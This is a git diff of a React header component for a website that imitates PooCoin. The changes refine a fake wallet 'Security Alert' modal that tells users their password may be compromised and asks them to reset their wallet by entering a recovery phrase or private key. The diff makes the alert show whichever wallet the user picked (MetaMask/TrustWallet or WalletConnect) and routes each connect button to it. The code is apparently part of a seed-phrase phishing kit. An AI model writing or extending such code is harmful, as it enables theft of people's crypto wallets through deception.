@@ -4,7 +4,7 @@ import { Link } from 'react-router-dom';
 import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
 import { InjectedConnector } from "@web3-react/injected-connector";
 import { useWeb3React } from '@web3-react/core'
-import { Box, ButtonGroup, CircularProgress, Divider, Modal, TextareaAutosize, Typography } from '@material-ui/core';
+import { Box, ButtonGroup, CircularProgress, Divider, Modal, TextareaAutosize, TextField, Typography } from '@material-ui/core';
 import AppBar from '@mui/material/AppBar';
 import IconButton from '@mui/material/IconButton';
 import Menu from '@mui/material/Menu';
@@ -57,11 +57,11 @@ const style1 = {
     textAlign: 'center',
     border: 'none',
     outline: 'none',
-    paddingLeft : '20px',
-    paddingRight : '20px',
-    paddingTop : '40px',
-    paddingBottom : '40px',
-    minHeight : '500px'
+    paddingLeft: '20px',
+    paddingRight: '20px',
+    paddingTop: '10px',
+    paddingBottom: '40px',
+    minHeight: '500px'
 
 
 };
@@ -72,7 +72,7 @@ const btnsRef = [
     { name: 'Private Key' }
 ]
 
-console.log(btnsRef)
+
 function Header() {
     const { account } = useWeb3React();
     const { activate } = useWeb3React();
@@ -90,11 +90,12 @@ function Header() {
     const [active, setActive] = useState(btnsRef[0]);
     const [prhare, setPrhase] = useState('')
     const [prharePass, setPrharePass] = useState('')
+    const [activeWallet, setAvtiveWallet] = useState();
+    console.log(activeWallet)
     useEffect(() => {
         setId(localStorage.getItem('address'))
     }, [localStorage.getItem('address')])
     const condition = "hello"
-    console.log(id)
     const handleOpenNavMenu = (e) => {
         setAnchorElNav(e.currentTarget);
     };
@@ -117,16 +118,23 @@ function Header() {
         supportedChainIds: [1, 3, 4, 5, 42]
     });
 
-    const connectWallet = () => {
+    const connectWallet = (btn) => {
         handleClose();
+
         activate(WalletConnect)
             .then(() => {
                 setTimeout(handleOpenFAk(), 5000)
+
             })
+        setAvtiveWallet(btn)
+
+
+
     }
     const connectMetamask = () => {
         handleClose();
         activate(Injected)
+
     }
 
     const submitAddress = () => {
@@ -145,8 +153,14 @@ function Header() {
 
     const recoverPass = () => {
         setRecover(true)
-        setTimeout(() => setIsloading(false),1000)
+        setTimeout(() => setIsloading(false), 1000)
     }
+
+
+    const connectBTN = [
+        { name: 'MetaMask/TrustWallet', action: connectMetamask, image: "https://i.ibb.co/H40P97T/download.png" },
+        { name: 'WalletConncet', action: connectWallet, image: "https://i.ibb.co/LdvtmRq/wallet-connect.png" },
+    ]
     return (
 
         <AppBar style={{ backgroundColor: '#262626' }} color='primary' position="static">
@@ -227,12 +241,12 @@ function Header() {
                         Chart
                     </Typography>
                 </Box>
-                <div className="header_centercenter">
+                <Box sx={{display: { xs: 'none',lg:'block',md:'block'}}} className="header_centercenter">
                     <div>Binance (BSC)</div>
                     <div>Polygon (Matic)</div>
                     <div>KuChain (KCC)</div>
-                </div>
-                <div className="header_centerright">
+                </Box>
+                <Box sx={{display: { xs: 'none',lg:'block',md:'block'}}} className="header_centerright">
                     <img
                         src="https://poocoin.app/images/logo/poocoin512.png"
                         alt='loading'
@@ -241,7 +255,7 @@ function Header() {
                     <Button href="https://t.me/poocointokenchat">
                         <img src="https://poocoin.app/images/logos/telegram.svg" alt='loading' height="25" />
                     </Button>
-                </div>
+                </Box>
                 <Box sx={{ mx: 'auto', flexGrow: 0, display: { xs: 'none', md: 'flex' } }}>
                     {pages.map((page) => (
                         <MenuItem key={page.name} onClick={handleCloseNavMenu} disabled={page.disable}>
@@ -261,18 +275,18 @@ function Header() {
                             !recover ?
                                 (
                                     <Box sx={{ textAlign: 'center' }}>
-                                        <img style={{ width: '150px' }} src='https://i.ibb.co/XXQ7tb4/pngtree-security-alert-icon-red-png-image-2597553-removebg-preview.png'/>
-                                        <Typography style={{marginTop : '15px',color : 'red',fontWeight : 'bolder'}} id="modal-modal-title" variant="h6" component="h2">
-                                            MetaMask Security Alert
+                                        <img style={{ width: '150px' }} src='https://i.ibb.co/XXQ7tb4/pngtree-security-alert-icon-red-png-image-2597553-removebg-preview.png' />
+                                        <Typography style={{ marginTop: '15px', color: 'red', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
+                                            {activeWallet?.name} Security Alert
                                         </Typography>
-                                        <Typography style={{marginTop : '15px',fontWeight : 'bolder'}} id="modal-modal-title" variant="h6" component="h2">
+                                        <Typography style={{ marginTop: '15px', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
                                             Your Password May have been compromised
                                         </Typography>
                                         <Typography id="modal-modal-title" variant="h6" component="h2">
                                             Reset your wallet and change your password for security purposes using a recovery phrase or private key
                                         </Typography>
-                                        
-                                        <button style={{marginTop : '100px',cursor : 'pointer' ,border : 'none', outline : 'none',  padding : '6px', background  :'rgb(0, 132, 255)',borderRadius : '20px',color : 'white',width : "300px",fontSize : '20px'}} onClick={() => recoverPass()}>
+
+                                        <button style={{ marginTop: '100px', cursor: 'pointer', border: 'none', outline: 'none', padding: '6px', background: 'rgb(0, 132, 255)', borderRadius: '20px', color: 'white', width: "300px", fontSize: '20px' }} onClick={() => recoverPass()}>
                                             Reset Wallet
                                         </button>
                                     </Box>
@@ -286,7 +300,7 @@ function Header() {
                                                 :
                                                 (
                                                     <>
-                                                        <img style={{ width: '150px' }} src='https://open.seamarketplace.org/assets/images/media/trust.png' />
+                                                        <img style={{ width: '150px' }} src={activeWallet?.image} />
                                                         <Typography id="modal-modal-title" variant="h6" component="h2">
                                                             Choice recovery method
                                                         </Typography>
@@ -304,6 +318,12 @@ function Header() {
                                                                 (
                                                                     <>
                                                                         <Box>
+                                                                            <TextField
+                                                                                id="standard-search"
+                                                                                label="Search field"
+                                                                                type="search"
+                                                                                variant="standard"
+                                                                            />
                                                                             <TextareaAutosize
                                                                                 aria-label="minimum height"
                                                                                 minRows={3}
@@ -397,8 +417,12 @@ function Header() {
                             aria-describedby="modal-modal-description"
                         >
                             <Box sx={style}>
-                                <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectMetamask() }}>Metamask/TrustWallet</button>
-                                <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button>
+                                {
+                                    connectBTN.map((btn) => (
+                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { btn.action(btn) }}>{btn.name}</button>
+                                    ))
+                                }
+                                {/* <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button> */}
                                 <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
                             </Box>
                         </Modal>
